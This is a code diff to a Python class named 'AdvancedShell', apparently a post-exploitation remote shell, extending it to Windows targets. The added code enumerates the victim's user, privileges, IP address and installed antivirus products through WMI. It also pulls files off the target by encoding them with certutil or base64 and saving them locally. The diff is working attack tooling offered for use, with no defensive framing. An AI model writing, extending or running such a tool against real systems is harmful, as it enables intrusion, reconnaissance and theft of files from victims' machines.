@@ -626,22 +626,45 @@ class AdvancedShell:
                         p=cmd.split(None,1);self.raw_test(p[1] if len(p)>1 else "echo TESTPING")
                     elif cmd.startswith('.info'):
                         print(f"{Y}[*] Enumerating...{W}")
-                        for l,c in [("OS","uname -a"),("User","whoami"),("ID","id"),("Host","hostname"),("PWD","pwd")]:
+                        if self.target_os=='windows':
+                            cmds=[("User","whoami"),("Host","hostname"),("OS","ver"),("IP","ipconfig | findstr IPv4"),("CWD","cd"),("Privs","whoami /priv | findstr Enabled"),("AV","wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName 2>nul || echo N/A")]
+                        else:
+                            cmds=[("OS","uname -a"),("User","whoami"),("ID","id"),("Host","hostname"),("CWD","pwd"),("Distro","cat /etc/os-release 2>/dev/null | head -2 || echo N/A")]
+                        for l,c in cmds:
                             o=self.execute(c)
-                            if o and '[' not in o:print(f"  {C}{l}:{W} {o.strip()}")
+                            if o and '[-]' not in o and '[!' not in o:
+                                # Clean up the cd/d error for Windows
+                                lines=[x for x in o.strip().split('\n') if 'cannot find the path' not in x.lower()]
+                                clean='\n'.join(lines).strip()
+                                if clean:print(f"  {C}{l}:{W} {clean}")
+                                else:print(f"  {C}{l}:{W} {R}failed{W}")
                             else:print(f"  {C}{l}:{W} {R}failed{W}")
                     elif cmd.startswith('.download') or cmd.startswith('.dl'):
                         p=cmd.split()
                         if len(p)<2:print("Usage: .download <remote> [local]");continue
                         rp=p[1];lp=p[2] if len(p)>2 else f"dl_{os.path.basename(rp)}"
                         os.makedirs(os.path.dirname(os.path.abspath(lp)) or '.',exist_ok=True)
-                        o=self.execute(f"base64 -w0 {rp}")
-                        if o and '[' not in o:
-                            try:d=base64.b64decode(o.strip());open(lp,'wb').write(d);print(f"{G}Saved: {lp} ({len(d)}B){W}")
-                            except Exception as e:print(f"{R}Error: {e}{W}")
+                        if self.target_os=='windows':
+                            o=self.execute(f'certutil -encodehex "{rp}" CON 0x40000001 2>nul')
+                        else:
+                            o=self.execute(f"base64 -w0 {rp}")
+                        if o and '[-]' not in o and '[!' not in o:
+                            try:
+                                clean=o.strip().replace('\r','').replace('\n','').replace(' ','')
+                                d=base64.b64decode(clean);open(lp,'wb').write(d);print(f"{G}Saved: {lp} ({len(d)}B){W}")
+                            except Exception as e:print(f"{R}Decode error: {e}{W}")
+                        else:print(f"{R}Failed to read file{W}")
                     elif cmd.startswith('cd '):
-                        path=cmd.split(' ',1)[1];o=self.execute(f"cd {path} && pwd")
-                        if o and o.strip().startswith('/') and '[' not in o:self.current_dir=o.strip().split('\n')[0]
+                        path=cmd.split(' ',1)[1]
+                        if self.target_os=='windows':
+                            o=self.execute(f'cd /d "{path}" && cd')
+                            if o and '[-]' not in o:
+                                lines=[x for x in o.strip().split('\n') if x.strip() and 'cannot find' not in x.lower()]
+                                if lines:self.current_dir=lines[-1].strip()
+                        else:
+                            o=self.execute(f"cd {path} && pwd")
+                            if o and o.strip().startswith('/') and '[-]' not in o:self.current_dir=o.strip().split('\n')[0]
+                        if o and '[-]' not in o:print(f"{G}CWD: {self.current_dir}{W}")
                         elif o:print(o)
                     else:
                         out=self.execute(cmd);self.last_output=out or ""
